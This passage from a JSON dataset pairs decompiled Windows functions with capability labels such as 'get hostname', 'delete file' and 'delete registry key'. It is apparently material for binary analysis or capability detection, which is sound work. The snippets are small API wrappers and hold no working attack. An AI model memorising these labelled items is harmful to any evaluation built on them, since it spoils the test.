}\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "0008d7a6": {
        "rules": [
            "get hostname"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d7a6(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpBuffer;\n    uint nSize;\n    \n    nSize = 0x10;\n    puVar2 = &lpBuffer;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&lpBuffer, &nSize);\n    fcn.000833ab(&lpBuffer);\n    return param_1;\n}\n",
        "token_count": 150
    },
    "0008da33": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008da33(uint lpFileName)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n    fcn.000858fb();\n    return uVar1;\n}\n",
        "token_count": 58
    },
    "0008ea1c": {
        "rules": [
            "delete registry key"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008ea1c(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(0x80000001, *param_2);\n    return iVar1 == 0;\n}\n",
        "token_count": 70
    }
}